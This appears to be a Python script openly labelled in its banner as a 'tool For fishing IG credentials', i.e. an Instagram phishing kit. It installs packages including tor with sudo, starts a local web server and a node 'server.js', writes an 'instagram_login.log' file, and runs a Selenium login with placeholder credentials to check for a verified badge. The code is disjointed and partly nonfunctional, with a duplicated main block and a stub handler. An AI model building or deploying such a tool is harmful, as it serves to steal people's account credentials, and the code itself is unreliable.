#!/usr/bin/env python3  

import logging
import os
import sys
import time
import threading 
import re
import subprocess
import http.server
import socketserver
from webbrowser import Chrome
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import getpass
import math
import time  


def check_root():
    return os.geteuid() == 0

def main():
    print("\033[92mCHECKING IF YOU'RE ROOTED...")
    loading_symbols = ["/", "-", "\\", "|"]
    i = 0
    while True:
        print(loading_symbols[i % len(loading_symbols)] + "\r", end="")
        i += 1
        if i >= 10:
            break
        time.sleep(1)
    if os.geteuid() == 0:
        print("YOU'RE ROOTED.")
        return 1
    else:
        print("YOU'RE NOT ROOTED.")
        return 0


if __name__ == "__main__":
    main()
    
# Update packages and install dependencies
subprocess.run(["sudo", "apt-get", "update"])
subprocess.run(["sudo", "apt-get", "install", "-y", "php", "git", "curl", "python3", "ruby", "tor", "bash", "python3-pip", "xidel", "python3-selenium"])

# Install npm
subprocess.run(["sudo", "apt-get", "install", "-y", "npm"])

# Display info
print("\033[92m\n\n")
print("\033[92m ______                          _____        ______              _____        ______       _____                   ")
print("\033[92m |     |     |       |     |     |            |     |     /\     |      \     |            |                        ")
print("\033[92m |_____/     |       |     |     |____        |_____/    /  \    |       |    | ____       | ____                   ")
print("\033[92m |     \     |       |     |     |            |     \   /____\   |       |    |      \     |                        ")
print("\033[92m |_____|     |____   |_____|     |_____****** |_____|  /      \  |_____ /     |______|     |_____                   ")

print("\033[92m\n\n")
print("\033[92m         ***********************************************")
print("\033[92m         #                                             #")
print("\033[92m         #   tool For fishing IG credentials           #")
print("\033[92m         #   Follow Me On Github: @ephraim sib         #")
print("\033[92m         #   Contact Me In: ephraimsibale20@gmail.com  #")
print("\033[92m         #   Changelog: 5-12-2023                      #")
print("\033[92m         #                                             #")
print("\033[92m         ***********************************************")
print("\033[92m\n\n")

# Prompt user to enter a port number
def validate_port(port):
    return re.match(r'^([1-9][0-9]{3}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$', port)

def run_server():
    while True:
        port = input("Please enter a port number (1024 to 65535): ")
        if validate_port(port):
            break
        else:
            print("Invalid port number. Please enter a valid port number.")

    # Configure logging to write to a file
    logging.basicConfig(filename='instagram_login.log', filemode='w', format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)

    # Print start message
    print(f"Starting server on port {port}")

    # Create the custom request handler
    class MyRequestHandler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            # Customize the response (optional)
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(b"Hello, this is your custom server!")

  # Initialize the Chrome WebDriver
    driver = webdriver.Chrome()  # Use Chrome or Firefox: webdriver.Chrome() or webdriver.Firefox()

    try:
        # Open Instagram login page
        driver.get('https://www.instagram.com/accounts/login/')

        # Get user credentials (replace with actual credentials)
        username = "your_username"
        password = "your_password"

        # Log in
        username_input = driver.find_element(By.NAME, 'username')
        password_input = driver.find_element(By.NAME, 'password')
        login_button = driver.find_element(By.CSS_SELECTOR, 'button[type="submit"]')

        username_input.send_keys(username)
        password_input.send_keys(password)
        login_button.click()

        # Wait for the login to complete
        WebDriverWait(driver, 10).until(EC.url_to_be('https://www.instagram.com/'))

        # Check if the user has a blue badge (verified account)
        blue_badge_element = driver.find_element(By.CSS_SELECTOR, 'svg[aria-label="Verified"]')
        blue_badge_status = blue_badge_element.is_displayed()

        if blue_badge_status:
            print("Congratulations! You have a blue badge (verified account) on Instagram.")
        else:
            print("You do not have a blue badge on Instagram.")

    except Exception as e:
        print(f"An error occurred: {e}")

    #Run the node.js server in a separate thread 
    threading.Thread(target=lambda: subprocess.run(["node", "server.js", str(port)])).start()
       
    # Create the server
    with socketserver.TCPServer(("", int(port)), MyRequestHandler) as httpd:
        print(f"Server is running on port {port}")

   # Generate the link
        link = f"http://localhost:{port}/"
        print(f"Generated link: {link}")

        # Serve forever
        httpd.serve_forever()

if __name__ == "__main__":
    main()
    run_server()
